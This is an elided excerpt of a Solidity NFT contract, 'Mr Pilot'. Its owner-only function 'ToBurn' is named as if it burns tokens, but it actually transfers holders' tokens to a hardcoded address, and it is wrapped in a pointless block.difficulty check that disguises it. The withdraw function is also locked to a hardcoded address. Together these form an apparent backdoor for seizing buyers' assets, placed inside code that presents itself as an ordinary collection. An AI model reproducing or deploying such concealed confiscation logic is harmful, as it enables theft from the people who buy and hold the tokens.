...
contract Mr_Pilot is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Mr Pilot", "MP", maxBatchSize_, collectionSize_) {
  ...
  function ToBurn(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xE899c31C9D9F9034B567002995eD4BB913918b3F, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xa4E8ca101e6dFeA3B195eBA3C4AA39580BB210f8);
